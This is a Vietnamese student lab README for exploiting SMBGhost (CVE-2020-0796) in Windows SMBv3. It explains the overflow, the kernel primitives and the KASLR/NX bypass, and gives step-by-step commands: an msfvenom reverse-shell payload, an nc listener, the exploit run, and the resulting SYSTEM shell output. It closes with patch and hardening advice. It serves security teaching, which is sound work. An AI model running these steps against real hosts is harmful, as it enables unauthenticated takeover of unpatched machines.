# CVE-2020-0796 — SMBGhost Windows SMBv3 RCE

Demo lab khai thác lỗ hổng **Integer Overflow dẫn đến Kernel Pool/Buffer Overflow** trong cơ chế xử lý nén của giao thức **SMBv3.1.1** trên hệ điều hành Windows (**CVSS 10.0 Critical**).

Khi máy chủ tiếp nhận gói tin nén `SMB2_COMPRESSION_TRANSFORM_HEADER`, hàm `srv2.sys!Srv2DecompressData` thực hiện tính toán kích thước bộ đệm cần cấp phát bằng phép cộng:
$$\text{TotalSize} = \text{OriginalCompressedSegmentSize} + \text{Offset}$$
Do thiếu kiểm tra tràn số nguyên 32-bit (`ULONG`), kẻ tấn công gửi gói tin có `OriginalCompressedSegmentSize = 0xFFFFFFFF` kết hợp phần offset dữ liệu thô (ví dụ: 16 bytes) làm giá trị bị tràn vòng (*wrap-around*) chỉ còn **15 bytes**. Windows cấp phát một vùng đệm quá nhỏ trong lookaside list (`0x1100` bytes), nhưng hàm giải nén lại bung ra dữ liệu lớn hơn `0x1100` bytes, dẫn đến **Tràn bộ đệm nhân ngoài biên (Kernel Pool Out-of-Bounds Write)** đè trực tiếp lên cấu trúc `SRVNET_BUFFER_HDR` kề cận. Lỗ hổng cho phép kẻ tấn công từ xa **chưa qua xác thực (Pre-authentication)** chiếm quyền điều khiển toàn bộ nhân hệ điều hành (`NT AUTHORITY\SYSTEM`).

---

## Thông tin sinh viên & đề tài

| Thuộc tính | Chi tiết |
| :--- | :--- |
| **Sinh viên** | **Hồ Tuấn Hưng (HTH)** |
| **Mã sinh viên** | B23DCAT121 |
| **Học phần** | An Toàn Mạng (INT1482) — Nhóm 4 |
| **Mã định danh** | **CVE-2020-0796** (SMBGhost / CoronaBlue) |
| **Điểm CVSS** | **10.0 Critical** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) |
| **Thành phần ảnh hưởng** | Driver nhân `srv2.sys` (Windows 10 1903/1909 x64, Windows Server 1903/1909) |
| **Loại lỗ hổng** | Integer Overflow $\rightarrow$ Kernel Pool Buffer Overflow $\rightarrow$ Pre-auth RCE (Ring 0 / SYSTEM) |

---

## ⚠️ Tuyên bố trung thực về phạm vi demo

> **Đọc kỹ phần này trước khi trình bày / nghiệm thu.**  
> Bài thực nghiệm này chứng minh nguyên lý khai thác lỗ hổng từ xa để chiếm quyền nhân hệ điều hành trong môi trường phòng lab được kiểm soát chặt chẽ.

| Thành phần | Thực tế / Mô phỏng | Ghi chú kỹ thuật |
| :--- | :--- | :--- |
| **Kích hoạt lỗi bộ nhớ qua SMB:445** | **THẬT (100%)** | Gửi gói tin nén độc hại qua cổng TCP 445 mà **không cần bất kỳ tài khoản/mật khẩu nào** (Pre-auth). |
| **Vượt KASLR & DEP/NX trong Kernel** | **THẬT (100%)** | Dò tìm `Low Stub` trong 1MB RAM vật lý để đọc bảng phân trang `PML4`, xóa bit NX trên PTE của `KUSER_SHARED_DATA`. |
| **Cướp luồng thực thi (RCE)** | **THẬT (100%)** | Ghi đè con trỏ ngắt `HalpApicRequestInterrupt` trong HAL Heap để CPU tự động thực thi shellcode với quyền `SYSTEM`. |
| **Tắt Windows Defender Real-time** | **Điều kiện Lab** | Môi trường lab cần tắt bảo vệ thời gian thực của Defender để tránh payload reverse shell bị ngắt tiến trình sau khi kích hoạt. |
| **Phiên bản hệ điều hành đích** | **Điều kiện Lab** | Bắt buộc đúng bản Windows 10 Version 1903 (Build 18362) hoặc Version 1909 (Build 18363) **chưa áp dụng bản vá KB4551762**. |

* **Điều demo CHỨNG MINH được:**
  * Lỗ hổng Integer Overflow trong `srv2.sys` hoàn toàn có thật và kích hoạt được qua mạng mà không cần xác thực danh tính.
  * Lỗi tràn bộ đệm được vũ khí hóa thành 2 công cụ primitive cực mạnh: **Ghi bộ nhớ ảo tùy ý (`write_primitive`)** và **Đọc bộ nhớ vật lý tùy ý (`read_physmem_primitive`)**.
  * Bẻ gãy các lớp phòng thủ hiện đại của Windows 10 (KASLR, DEP, SMEP) để chiếm quyền điều khiển cao nhất `NT AUTHORITY\SYSTEM`.
* **Điều demo KHÔNG chứng minh / Hạn chế:**
  * Khai thác này không áp dụng được trên các bản Windows 10 từ 2004 trở đi (Microsoft đã tái cấu trúc lại cơ chế nén).
  * Việc tìm kiếm `Low Stub` và bảng `HalpInterruptController` dựa vào chữ ký byte và heuristic bộ nhớ; nếu môi trường máy ảo có cấu hình RAM lạ hoặc offset thay đổi, khai thác có thể gây sập hệ điều hành (màn hình xanh BSOD).

---

## Nội dung repository

```text
SMBGhost_RCE_PoC/
├── README.md               # Tài liệu mô tả chi tiết bài lab và hướng dẫn
├── exploit.py              # Script khai thác chính (viết primitive, bypass KASLR/DEP, RCE)
├── lznt1.py                # Thư viện nén/giải nén LZNT1 & hàm tạo gói nén độc hại (compress_evil)
├── smb_win.py              # Thư viện xây dựng gói tin bắt tay SMB (Negotiate & Compress)
└── kernel_shellcode.asm    # Mã nguồn hợp ngữ (x64 Assembly) chạy tại Ring 0 khôi phục hàm ngắt
```

---

## Giải thích chi tiết các thành phần mã nguồn

### 1. `exploit.py` — Điều phối khai thác trung tâm
* **`write_primitive(ip, port, data, addr)`:** Gửi gói tin nén với `0xFFFFFFFF` làm tràn bộ nhớ, ghi đè con trỏ `pNetRawBuffer` trong cấu trúc `SRVNET_BUFFER_HDR` để ép nhân Windows chép dữ liệu `data` vào địa chỉ `addr`.
* **`read_physmem_primitive(ip, port, phys_addr)`:** Dựng một cấu trúc mô tả bộ nhớ giả (`Fake MDL`) tại `KUSER_SHARED_DATA + 0x900`, đè con trỏ `pMDL1` để đọc trộm dữ liệu từ bất kỳ địa chỉ RAM vật lý nào.
* **`find_low_stub()` & `find_pml4_selfref()`:** Quét 1MB RAM vật lý đầu tiên để tìm khối `PROCESSOR_START_BLOCK` (`LOWSTUB_JMP = 0x1000600E9`), giải mã địa chỉ bảng phân trang `PML4` nhằm vô hiệu hóa hoàn toàn KASLR.
* **`overwrite_pte()`:** Tính toán địa chỉ PTE của trang nhớ `KUSER_SHARED_DATA` và xóa bit 63 (NX bit) để cho phép thực thi mã độc trong trang dữ liệu này.
* **`search_hal_heap()` & Hijacking:** Định vị con trỏ hàm ngắt định thời `HalpApicRequestInterrupt` tại offset `0x78` của `HalpInterruptController` trong HAL Heap, ghi đè địa chỉ này bằng địa chỉ chứa `KERNEL_SHELLCODE`.

### 2. `lznt1.py` — Cơ chế nén LZNT1 độc hại
* Triển khai thuật toán nén chuẩn LZNT1 của Microsoft.
* Cung cấp hàm **`compress_evil(data)`**: tạo ra các khối dữ liệu nén được tính toán kích thước đặc biệt nhằm kiểm soát chính xác lượng byte tràn vào cấu trúc `SRVNET_BUFFER_HDR`.

### 3. `smb_win.py` — Đóng gói giao thức SMBv3.1.1
* **`smb_negotiate(sock)`:** Gửi gói `SMB2 NEGOTIATE Request` kích hoạt hỗ trợ giao thức SMB 3.1.1 và ngữ cảnh nén (`SMB2_COMPRESSION_CAPABILITIES`).
* **`smb_compress(sock, compressed_data, decompressed_len, uncompressed_data)`:** Đóng gói tiêu đề nén `SMB2_COMPRESSION_TRANSFORM_HEADER` kèm các giá trị kích thước phục vụ tràn số nguyên.

### 4. `kernel_shellcode.asm` — Shellcode nhân mức Ring 0
* Chạy ngay khi CPU kích hoạt ngắt phần cứng.
* Nhiệm vụ tối quan trọng: **Khôi phục ngay con trỏ ngắt gốc** cho Windows để hệ thống không bị treo hoặc phát sinh lỗi màn hình xanh (BSOD).
* Nâng đặc quyền tiến trình và kích hoạt `USER_PAYLOAD` kết nối ngược về máy tấn công.

---

## Topology mạng trong bài lab

```text
     KALI LINUX (Attacker)                          WINDOWS 10 (Target)
       192.168.249.131                                192.168.249.130
   ┌───────────────────────┐                      ┌───────────────────────┐
   │  • exploit.py         │       TCP: 445       │  • Windows 10 1903    │
   │  • nc -lvnp 4444      │─────────────────────►│  • srv2.sys (chưa vá) │
   │  • msfvenom x64 shell │                      │  • SMBv3 Compression  │
   │                       │◄─────────────────────│  • NT AUTHORITY\SYSTEM│
   └───────────────────────┘   Reverse Shell:4444 └───────────────────────┘
```

---

## Yêu cầu môi trường

* **Máy tấn công (Kali Linux):**
  * Python 3.x
  * Công cụ: `netcat` (`nc`), `msfvenom`
  * Địa chỉ IP ví dụ: `192.168.249.131`
* **Máy nạn nhân (Windows 10 x64 Target):**
  * Hệ điều hành: Windows 10 Pro / Enterprise Version 1903 (OS Build 18362.356)
  * Dịch vụ: File and Printer Sharing (SMB port 445 đang mở)
  * Trạng thái vá lỗi: **Chưa cài đặt KB4551762**
  * Trạng thái nén: Mặc định bật (`DisableCompression = 0` hoặc chưa cấu hình)
  * Địa chỉ IP ví dụ: `192.168.249.130`

---

## Hướng dẫn thực hành nhanh (Quick Start)

### Bước 1: Tạo payload Reverse Shell trên Kali Linux
Chạy lệnh `msfvenom` tạo shellcode 64-bit trỏ về IP máy Kali:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.249.131 LPORT=4444 -f py -v USER_PAYLOAD -o payload.txt
```
Copy chuỗi byte trong `payload.txt` dán đè vào biến `USER_PAYLOAD` ở dòng 91 trong file `exploit.py`.

### Bước 2: Khởi tạo tiến trình lắng nghe (Terminal 1)
```bash
nc -lvnp 4444
```

### Bước 3: Thực thi mã khai thác (Terminal 2)
```bash
cd SMBGhost_RCE_PoC
python3 exploit.py -ip 192.168.249.130
```

**Quá trình thực thi thành công:**
```text
[+] found low stub at phys addr 13000!
[+] PML4 at 1ad000
[+] base of HAL heap at fffff79480000000
[+] ntoskrnl entry at fffff80645792010
[+] found PML4 self-ref entry 1eb
[+] found HalpInterruptController at fffff79480001478
[+] found HalpApicRequestInterrupt at fffff80645cb3bb0
[+] built shellcode!
[+] KUSER_SHARED_DATA PTE at fffff5fbc0000000
[+] KUSER_SHARED_DATA PTE NX bit cleared!
[+] Wrote shellcode at fffff78000000a00!
[+] Press a key to execute shellcode!
[+] overwrote HalpInterruptController pointer, should have execution shortly...
```

Nhấn phím `Enter` để kích hoạt cướp con trỏ ngắt.

### Bước 4: Thu nhận Shell quyền SYSTEM (Tại Terminal 1)
```text
connect to [192.168.249.131] from (UNKNOWN) [192.168.249.130] 49771
Microsoft Windows [Version 10.0.18362.356]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

## Biện pháp phòng thủ & Kiểm chứng (Remediation & Hardening)

### 1. Biện pháp triệt để: Cập nhật bản vá bảo mật
Cài đặt bản vá cập nhật bảo mật chính thức do Microsoft phát hành: **KB4551762**. Bản vá này bổ sung hàm kiểm tra an toàn `RtlULongAdd()` trong `srv2.sys`, chặn đứng việc tràn số nguyên khi tính toán kích thước giải nén.

### 2. Biện pháp tạm thời: Vô hiệu hóa tính năng nén SMBv3
Nếu chưa thể khởi động lại máy để cập nhật bản vá, vô hiệu hóa nén ngay lập tức bằng PowerShell (Run as Administrator):
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force
```
*Lưu ý: Biện pháp này có hiệu lực ngay mà không yêu cầu khởi động lại máy tính, không làm gián đoạn dịch vụ chia sẻ tệp.*

### 3. Kiểm chứng hiệu quả phòng thủ
Sau khi cấu hình `DisableCompression = 1` trên Windows 10:
* Quét cổng bằng Nmap: Cổng TCP 445 và giao thức SMB 3.1.1 vẫn hoạt động bình thường.
* Chạy lại `exploit.py`: Máy chủ từ chối đàm phán nén, script báo lỗi:
  ```text
  [-] physical read primitive failed!
  ```
  Máy Kali không thể thu được phiên shell, chứng minh bề mặt tấn công đã được vô hiệu hóa hoàn toàn.

---

## Tài liệu tham khảo

1. **Microsoft Security Advisory:** [CVE-2020-0796 | Windows SMBv3 Client/Server Remote Code Execution Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)
2. **Ricerca Security Writeup:** [I'll ask your body: SMBGhost Pre-Auth RCE](https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html)
3. **Mã nguồn PoC gốc:** [chompie1337/SMBGhost_RCE_PoC](https://github.com/chompie1337/SMBGhost_RCE_PoC)
4. **Thư viện LZNT1:** [you0708/lznt1](https://github.com/you0708/lznt1)

---

## ⚖️ Tuyên bố trách nhiệm (Disclaimer)

Mã nguồn và tài liệu trong repository này được thực hiện trong khuôn khổ **Bài tập lớn môn An Toàn Mạng (INT1482) - Học viện Công nghệ Bưu chính Viễn thông (PTIT)** chỉ nhằm mục đích nghiên cứu, học tập và chứng minh nguyên lý an ninh mạng trên môi trường lab giả lập. Tác giả không chịu trách nhiệm đối với bất kỳ hành vi sử dụng trái phép nào trên các hệ thống không thuộc quyền sở hữu hoặc không được cấp phép kiểm thử.
